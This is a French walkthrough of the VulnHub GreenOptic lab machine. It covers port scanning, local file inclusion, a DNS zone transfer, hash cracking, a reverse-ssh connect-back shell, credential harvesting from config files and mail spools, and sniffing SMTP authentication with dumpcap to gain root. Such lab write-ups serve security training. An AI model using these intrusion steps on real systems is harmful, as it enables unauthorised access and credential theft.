---
title: Solution du CTF GreenOptic de VulnHub
tags: [CTF, VulnHub]
---


### GreenLantern

Je continue et termine les CTFs créés par *Thomas Williams* et proposés sur VulnHub avec ce [GreenOptic](https://vulnhub.com/entry/greenoptic-1,510/).

Et ça part direct avec le scan de port avec détection de vulns habituel :

```bash
sudo nmap -sCV --script vuln -T5 -p- 192.168.56.137
```

Beaucoup de CVEs sont remontés, en particulier pour `bind`, j'ai dû fortement réduire l'output :

```
Nmap scan report for 192.168.56.137
Host is up (0.00033s latency).
Not shown: 65436 filtered tcp ports (no-response), 94 filtered tcp ports (host-prohibited)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
| vulners: 
|   vsftpd 3.0.2: 
|       CVE-2021-3618   7.4     https://vulners.com/cve/CVE-2021-3618
|_      CVE-2015-1419   5.0     https://vulners.com/cve/CVE-2015-1419
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.4: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:173661      9.8     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
--- snip ---
53/tcp    open  domain  ISC BIND 9.11.4-P2 (RedHat Enterprise Linux 7)
| vulners: 
|   cpe:/a:isc:bind:9.11.4-p2: 
|       CVE-2021-25216  9.8     https://vulners.com/cve/CVE-2021-25216
|       CVE-2020-8616   8.6     https://vulners.com/cve/CVE-2020-8616
|       CVE-2020-8625   8.1     https://vulners.com/cve/CVE-2020-8625
|       PACKETSTORM:180550      7.5     https://vulners.com/packetstorm/PACKETSTORM:180550      *EXPLOIT*
|       MSF:AUXILIARY-DOS-DNS-BIND_TSIG_BADTIME-        7.5     https://vulners.com/metasploit/MSF:AUXILIARY-DOS-DNS-BIND_TSIG_BADTIME- *EXPLOIT*
|       FBC03933-7A65-52F3-83F4-4B2253A490B6    7.5     https://vulners.com/githubexploit/FBC03933-7A65-52F3-83F4-4B2253A490B6  *EXPLOIT*
|       CVE-2023-50387  7.5     https://vulners.com/cve/CVE-2023-50387
|       CVE-2023-4408   7.5     https://vulners.com/cve/CVE-2023-4408
--- snip ---
80/tcp    open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-trace: TRACE is enabled
--- snip ---
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
--- snip ---
10000/tcp open  http    MiniServ 1.953 (Webmin httpd)
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|       http://www.exploit-db.com/exploits/1997/
|_      http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
| http-phpmyadmin-dir-traversal: 
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: UNKNOWN (unable to test)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform a>
|       
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd :
|   <h1>Error - Document follows</h1>
|   <p>This web server is running in SSL mode. Try the URL <a href='https://websrv01.greenoptic.vm:10000/'>https://websrv01.greenoptic.vm:10000/</a> instead.</p>
|   
|     References:
|       http://www.exploit-db.com/exploits/1244/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-litespeed-sourcecode-download: 
| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)
| /index.php source code:
| <h1>Error - Document follows</h1>
|_<p>This web server is running in SSL mode. Try the URL <a href='https://websrv01.greenoptic.vm:10000/'>https://websrv01.greenoptic.vm:10000/</a> instead.</p>
--- snip ---
```

La page d'index semble être une coquille vide, alors j'ai énuméré les fichiers et dossiers :

```console
$ feroxbuster -u http://192.168.56.137/ -w DirBuster-0.12/directory-list-2.3-big.txt -n -x php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.137/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php, html]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      350l     1034w    17119c http://192.168.56.137/index.html
301        7l       20w      238c http://192.168.56.137/account
301        7l       20w      234c http://192.168.56.137/css
301        7l       20w      233c http://192.168.56.137/js
301        7l       20w      234c http://192.168.56.137/img
200      129l      521w     6687c http://192.168.56.137/statement.html
[####################] - 12m  3820683/3820683 0s      found:6       errors:0      
[####################] - 12m  3820683/3820683 5003/s  http://192.168.56.137/
```

Dns le dossier `account`, la page d'index redirige vers `http://192.168.56.137/account/index.php?include=cookiewarning`. Le paramètre `include` est assez explicite.

J'ai un fichier nommé `logfiles.txt` que j'avais fait et qui contient la plupart des paths intéressants à tester, mais on trouve ce genre de listes facilement (`SecLists`, etc).

```console
$ ffuf -u "http://192.168.56.137/account/index.php?include=FUZZ" -w wordlists/files/logfiles.txt  -fs 4898

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.137/account/index.php?include=FUZZ
 :: Wordlist         : FUZZ: wordlists/files/logfiles.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 4898
________________________________________________

/etc/hosts              [Status: 200, Size: 5076, Words: 126, Lines: 102, Duration: 9ms]
/etc/passwd             [Status: 200, Size: 6330, Words: 122, Lines: 130, Duration: 3ms]
/etc/os-release         [Status: 200, Size: 5311, Words: 114, Lines: 116, Duration: 6ms]
/etc/redhat-release     [Status: 200, Size: 4955, Words: 112, Lines: 101, Duration: 38ms]
/etc/httpd/conf/httpd.conf [Status: 200, Size: 16623, Words: 2134, Lines: 452, Duration: 93ms]
/proc/version           [Status: 200, Size: 5088, Words: 128, Lines: 101, Duration: 62ms]
/proc/cmdline           [Status: 200, Size: 5108, Words: 117, Lines: 101, Duration: 123ms]
/var/log/dmesg          [Status: 200, Size: 36411, Words: 5485, Lines: 612, Duration: 41ms]
/var/run/utmp           [Status: 200, Size: 6070, Words: 108, Lines: 100, Duration: 22ms]
/var/log/wtmp           [Status: 200, Size: 11830, Words: 108, Lines: 103, Duration: 34ms]
/etc/group              [Status: 200, Size: 5576, Words: 108, Lines: 151, Duration: 449ms]
/etc/crontab            [Status: 200, Size: 5369, Words: 199, Lines: 115, Duration: 474ms]
/etc/motd               [Status: 200, Size: 4918, Words: 108, Lines: 100, Duration: 559ms]
/etc/issue.net          [Status: 200, Size: 4940, Words: 112, Lines: 102, Duration: 579ms]
/etc/issue              [Status: 200, Size: 4941, Words: 112, Lines: 103, Duration: 612ms]
/etc/my.cnf             [Status: 200, Size: 5488, Words: 160, Lines: 119, Duration: 621ms]
/etc/inittab            [Status: 200, Size: 5429, Words: 171, Lines: 117, Duration: 621ms]
/etc/services           [Status: 200, Size: 675211, Words: 284162, Lines: 11276, Duration: 628ms]
:: Progress: [275/275] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

On a clairement un directory traversal. Via le `/etc/passwd` je trouve plusieurs accounts :

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
sam:x:1000:1000::/home/sam:/bin/bash
terry:x:1001:1001::/home/terry:/bin/bash
named:x:25:25:Named:/var/named:/sbin/nologin
alex:x:1002:1002::/home/alex:/bin/bash
dovecot:x:97:97:Dovecot IMAP server:/usr/libexec/dovecot:/sbin/nologin
dovenull:x:997:993:Dovecot's unauthorized user:/usr/libexec/dovecot:/sbin/nologin
monitor:x:1003:1003::/home/monitor:/bin/bash
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
```

J'étais aussi curieux de voir ce qu'il y avait derrière ce port DNS en TCP. Typiquement un indice qu'un transfert de zone est possible... Et c'est le cas :

```console
$ dig -t AXFR greenoptic.vm @192.168.56.137

; <<>> DiG 9.20.10 <<>> -t AXFR greenoptic.vm @192.168.56.137
;; global options: +cmd
greenoptic.vm.          3600    IN      SOA     websrv01.greenoptic.vm. root.greenoptic.vm. 1594567384 3600 600 1209600 3600
greenoptic.vm.          3600    IN      NS      ns1.greenoptic.vm.
ns1.greenoptic.vm.      3600    IN      A       127.0.0.1
recoveryplan.greenoptic.vm. 3600 IN     A       127.0.0.1
websrv01.greenoptic.vm. 3600    IN      A       127.0.0.1
greenoptic.vm.          3600    IN      SOA     websrv01.greenoptic.vm. root.greenoptic.vm. 1594567384 3600 600 1209600 3600
;; Query time: 6 msec
;; SERVER: 192.168.56.137#53(192.168.56.137) (TCP)
;; WHEN: Fri Jul 18 19:10:52 CEST 2025
;; XFR size: 6 records (messages 1, bytes 235)
```

Il y a bien un site web livré sur `recoveryplan.greenoptic.vm` mais il est protégé par une authentification basic.

J'ai aussi lancé `ncrack` avec `rockyou` sur le FTP, mais comme il tournait toujours, je me suis continué sur la faille trouvée.

Comme on le voit dans l'output de `ffuf`, aucun fichier n'est actionable pour une LFI (fichier de log dans lequel écrire, `/proc/self/environ`, etc).

J'ai donc choisi d'utiliser le [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) de `synacktiv`, mais sur des vieux CTFs, j'ai toujours peur de cour circuiter le chemin attendu.

L'utilisation des filtres PHP chainés a permis de confirmer qu'il s'agissait d'une faille `include` et d'obtenir une exécution de commandes.

Ayant obtenu le code source, le script ressemble à ceci :

```php
<?php

if ($_GET['include'] == "") {
    header('Location: index.php?include=cookiewarning');
    die();
}
?>
--- snip ---
<?php
$file = $_GET['include'];
require_once($file);
?>
```

Je retrouve des vhosts dans `/etc/httpd/conf.d/vhosts.conf` :

```apache
<VirtualHost *:80>
    DocumentRoot "/var/www/html"
    ServerName    websrv01.greenoptic.vm
    # Other directives here
</VirtualHost>

<VirtualHost *:80>
    DocumentRoot "/var/www/recoveryplan"
    ServerName recoveryplan.greenoptic.vm
    # Other directives here
</VirtualHost>
```

À la racine de `/var/www`, je trouve un fichier `.htpasswd` correspondant aux identifiants demandés sur `recovery` :

```
staff:$apr1$YQNFpPkc$rhUZOxRE55Nkl4EDn.1Po.
```

Le mot de passe est faible :

```console
$ john --wordlist=wordlists/rockyou.txt hash.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Note: Passwords longer than 5 [worst case UTF-8] to 15 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
wheeler          (staff)     
1g 0:00:00:00 DONE (2025-07-18 23:15) 5.000g/s 66240p/s 66240c/s 66240C/s go2hell..lincoln1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Une fois authentifié, on tombe sur un forum `phpBB`. Je vois par exemple un post avec un fichier zip :

```
Team,

During this critical time, we need to be extra diligent by ensuring we are doing thorough checks.

As discussed in our team meeting, we do not know how the attackers got in currently, but as the account portal is the most dynamic bit of software we are running on our website, we believe the vulnerabilities to exist there, hence taking it offline until we can investigate further.

Sam - thanks for volunteering to help earlier. The network monitoring I told you about is located here: dpi.zip.
I have e-mailed you the password. Let me know as soon as possible if you find anything suspicious; the CEO has asked for an update to ensure the attackers are off our network.

Kind regards,
Terry
Incident Responder
```

Le zip étant protégé par mot de passe, j'ai tenté de le casser (`zip2john` puis `john`) mais le password est robuste.

### GreenWashing

J'ai décidé de valider l'idée selon laquelle il fallait avoir un premier shell avec `www-data` et je me suis servi de `reverse-ssh` en connect back. D'abord, je lance ça sur ma machine :

```console
$ ./reverse-sshx64 -l -p 55555 -v
2025/07/18 23:24:40 Starting ssh server on :55555
2025/07/18 23:24:40 Success: listening on [::]:55555
```

Puis sur la victime :

```bash
./reverse-sshx64 -p 55555 192.168.56.1
```

J'obtiens alors :

```
2025/07/18 23:24:48 Successful authentication with password from reverse@192.168.56.137:57064
2025/07/18 23:24:48 Attempt to bind at 127.0.0.1:8888 granted
2025/07/18 23:24:48 New connection from 192.168.56.137:57064: apache on websrv01.greenoptic.vm reachable via 127.0.0.1:8888
```

Je n'ai plus qu'à me connecter sur le tunnel local créé avec le mot de passe `letmeinbrudipls` :

```bash
ssh -p 8888 127.0.0.1
```

Je trouve des identifiants dans la configuration du forum :

```php
<?php
// phpBB 3.2.x auto-generated configuration file
// Do not change anything in this file!
$dbms = 'phpbb\\db\\driver\\mysqli';
$dbhost = 'localhost';
$dbport = '';
$dbname = 'phpbb';
$dbuser = 'phpbb';
$dbpasswd = 'foj90j23RSDjf923!fjfj';
$table_prefix = 'phpbb_';
$phpbb_adm_relative_path = 'adm/';
$acm_type = 'phpbb\\cache\\driver\\file';

@define('PHPBB_INSTALLED', true);
// @define('PHPBB_DISPLAY_LOAD_TIME', true);
@define('PHPBB_ENVIRONMENT', 'production');
// @define('DEBUG_CONTAINER', true);
```

Et finalement le hash de l'utilisateur `terry` :

```console
MariaDB [phpbb]> select username, user_password from phpbb_users;
+---------------------------+--------------------------------------------------------------+
| username                  | user_password                                                |
+---------------------------+--------------------------------------------------------------+
| Anonymous                 |                                                              |
| terry                     | $2y$10$A/gz.GPsDvF.7xpxKAJL3O6oWd7tCIruY6JVKzHw.AxQXjbwP3g5u |
| AdsBot [Google]           |                                                              |
| Alexa [Bot]               |                                                              |
--- snip ---
```

Malheureusement, je ne suis pas parvenu à casser ce hash.

Je me suis penché sur les utilisateurs existants. `alex` fait partie du groupe `wireshark` alors que les autres n'ont que leur groupe perso, c'est intéressant.

```console
bash-4.2$ id alex
uid=1002(alex) gid=1002(alex) groups=1002(alex),994(wireshark)
```

`sam` a son fichier`mail` lisible par tous :

```console
bash-4.2$ find / -user sam -ls 2> /dev/null 
1186078    4 -rwxr-xr-x   1 sam      mail          508 Jul 12  2020 /var/spool/mail/sam
26625149    0 drwx------   2 sam      sam            62 Jul 12  2020 /home/sam
```

On y trouve un mot de passe :

```
From terry@greenoptic.vm  Sun Jul 12 16:13:45 2020
Return-Path: <terry@greenoptic.vm>
X-Original-To: sam
Delivered-To: sam@websrv01.greenoptic.vm
Received: from localhost (localhost [IPv6:::1])
        by websrv01.greenoptic.vm (Postfix) with ESMTP id A8D371090085
        for <sam>; Sun, 12 Jul 2020 16:13:18 +0100 (BST)
Message-Id: <20200712151322.A8D371090085@websrv01.greenoptic.vm>
Date: Sun, 12 Jul 2020 16:13:18 +0100 (BST)
From: terry@greenoptic.vm

Hi Sam, per the team message, the password is HelloSunshine123
```

Il en va de même pour `terry` :

```
From serversupport@greenoptic.vm  Sun Jul 12 15:52:19 2020
Return-Path: <serversupport@greenoptic.vm>
X-Original-To: terry
Delivered-To: terry@websrv01.greenoptic.vm
Received: from localhost (localhost [IPv6:::1])
        by websrv01.greenoptic.vm (Postfix) with ESMTP id C54E21090083
        for <terry>; Sun, 12 Jul 2020 15:51:32 +0100 (BST)
Message-Id: <20200712145137.C54E21090083@websrv01.greenoptic.vm>
Date: Sun, 12 Jul 2020 15:51:32 +0100 (BST)
From: serversupport@greenoptic.vm

Terry

As per your request we have installed phpBB to help with incident response.
Your username is terry, and your password is wsllsa!2

Let us know if you have issues
Server Support - Linux
```

Le mot de passe de `sam` me permet d'extraire la capture wireshark de l'archive zip récupérée plus tôt. On retrouve des requêtes HTTP avec l'authentification basic et l'identifiant `staff:wheeler` déjà cassé, mais aussi une connexion FTP :

```
USER alex
PASS FwejAASD1
SYST
TYPE I
PORT 192,168,1,252,219,123
STOR briefingnotes.txt
QUIT
```

Le fichier transféré est vide d'après la capture.

Les identifiants permettent un accès SSH.

### GreenDay

Une fois le flag obtenu :

```console
[alex@websrv01 ~]$ ls -al
total 20
drwx------. 3 alex alex 136 Jul 12  2020 .
drwxr-xr-x. 6 root root  57 Jul 12  2020 ..
lrwxrwxrwx. 1 root root   9 Jul 12  2020 .bash_history -> /dev/null
-rw-r--r--. 1 alex alex  18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 alex alex 193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 alex alex 231 Apr  1  2020 .bashrc
-rwx------. 1 alex alex  70 Jul 12  2020 user.txt
drwxr-xr-x. 2 alex alex  41 Jul 12  2020 .wireshark
-rw-------. 1 alex alex 100 Jul 12  2020 .Xauthority
[alex@websrv01 ~]$ cat user.txt 
Well done. Now to try and get root access.

Think outside of the box!
```

Je plonge dans cette histoire de `wireshark` :

```console
[alex@websrv01 ~]$ find / -group wireshark -ls 2> /dev/null 
597443   84 -rwxr-x---   1 root     wireshark    82368 Apr  1  2020 /usr/sbin/dumpcap
[alex@websrv01 ~]$ /usr/sbin/getcap /usr/sbin/dumpcap
/usr/sbin/dumpcap = cap_net_admin,cap_net_raw+ep
```

Le seul fichier du groupe est `dumpcap`. Il n'est pas setuid mais dispose de la capability `cap_net_raw+ep` permettant d'écouter le trafic réseau.

Ma première tentative a été d'écouter tous les ports potentiellement intéressants, même le `webmin` en TLS sur le port 10000 au cas où le certificat de la machine serait accessible.

```console
[alex@websrv01 ~]$ /usr/sbin/dumpcap -i enp0s3 -f "port 21 or port 25 or port 80 or port 53 or port 3306 or port 10000" -w capture.pcap
Capturing on 'enp0s3'
File: capture.pcap
Packets captured: 8
Packets received/dropped on interface 'enp0s3': 8/0 (pcap:0/dumpcap:0/flushed:0) (100.0%)
```

Il s'est avéré que les paquets étaient dûs à mon navigateur qui continuait à communiquer.

Je peux regarder les communications réseau en cours avec `watch ss -ntp` qui lance `ss` toutes les deux secondes. Malheureusement le trafic que l'on est censé capturer doit être très bref. Il me faut plutôt voir les communications finies il y a peu de temps (celles en `TIME_WAIT`).

`netstat` faisait ça par défaut, mais avec la commande `ss` qui l'a remplacé, il faut des options particulières :

```console
[alex@websrv01 ~]$ ss -t -n state time-wait
Recv-Q Send-Q                                             Local Address:Port                                                            Peer Address:Port              
0      0                                                          [::1]:25                                                                    [::1]:57644              
0      0                                                          [::1]:25                                                                    [::1]:57648
```

Maintenant, je sais quelle interface et quel port surveiller :

```console
[alex@websrv01 ~]$ /usr/sbin/dumpcap -i lo -f "tcp port 25" -w locapt.pcap
Capturing on 'Loopback'
File: locapt.pcap
Packets captured: 15
Packets received/dropped on interface 'Loopback': 15/0 (pcap:0/dumpcap:0/flushed:0) (100.0%)
```

Je trouve bien une authentification sur le SMTP :

```
220 websrv01.greenoptic.vm ESMTP Postfix

EHLO websrv01.greenoptic.vm

250-websrv01.greenoptic.vm
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-AUTH PLAIN LOGIN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN

AUTH PLAIN AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28=

535 5.7.8 Error: authentication failed: generic failure

QUIT

221 2.0.0 Bye
```

Le protocole envoie le nom d'utilisateur et le mot de passe avec un octet nul entre les deux, le tout encodé en base64 :

```console
$ echo AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28= | base64 -d | hexdump -C
00000000  00 72 6f 6f 74 00 41 53  66 6f 6a 6f 6a 32 65 6f  |.root.ASfojoj2eo|
00000010  7a 78 63 7a 7a 6d 65 64  6c 6d 65 64 41 53 41 53  |zxczzmedlmedASAS|
00000020  44 4b 6f 6a 33 6f                                 |DKoj3o|
```

Les identifiants permettent l'accès root :

```console
[root@websrv01 ~]# ls
anaconda-ks.cfg  root.txt
[root@websrv01 ~]# cat root.txt 
Congratulations on getting root!

  ____                      ___        _   _      
 / ___|_ __ ___  ___ _ __  / _ \ _ __ | |_(_) ___ 
| |  _| '__/ _ \/ _ \ '_ \| | | | '_ \| __| |/ __|
| |_| | | |  __/  __/ | | | |_| | |_) | |_| | (__ 
 \____|_|  \___|\___|_| |_|\___/| .__/ \__|_|\___|
                                |_|             

You've overcome a series of difficult challenges, so well done!

I'm happy to make my CTFs available for free. If you enjoyed doing the CTF, please leave a comment on my blog at https://security.caerdydd.wales - I will be happy for your feedback so I can improve them and make them more enjoyable in the future.

*********
Kindly place your vote on the poll located here to let me know how difficult you found it: https://security.caerdydd.wales/greenoptic-ctf/
*********

Thanks,
bootlesshacker
```

Je n'ai pas trouvé de `crontab` derrière la connexion SMTP. Ca vient visiblement de `monit`, un outil de monitoring :

```console
[root@websrv01 ~]# grep -v "^#" /etc/monitrc
set daemon  30              # check services at 30 seconds intervals
set log syslog



set httpd port 2812 and
    use address localhost  # only accept connection from localhost (drop if you use M/Monit)
    allow localhost        # allow localhost to connect to the server and
    allow admin:monit      # require user 'admin' with password 'monit'
    #with ssl {            # enable SSL/TLS and set path to server certificate
    #    pemfile: /etc/ssl/certs/monit.pem
    #}

check host greenoptic.vm with address 127.0.0.1
 if failed
        port 443
        protocol http
        then alert

include /etc/monit.d/*
set mailserver localhost port 25 username root password "ASfojoj2eozxczzmedlmedASASDKoj3o"
set alert monitor@localhost with reminder on 1 cycles #email address which will receive monit alerts
```

Après avoir regardé d'autres solutions sur le web, les participants accédaient aux fichiers mails à travers la faille include.

Il fallait supposer que les permissions permettaient à `www-data` de lire les fichiers, ce qui n'est pas une situation normale.

L'utilisation des filtres PHP rend le cheminement plus logique, mais ouvre aussi la voie à des raccourcis (utilisation d'un exploit kernel après le premier shell). 
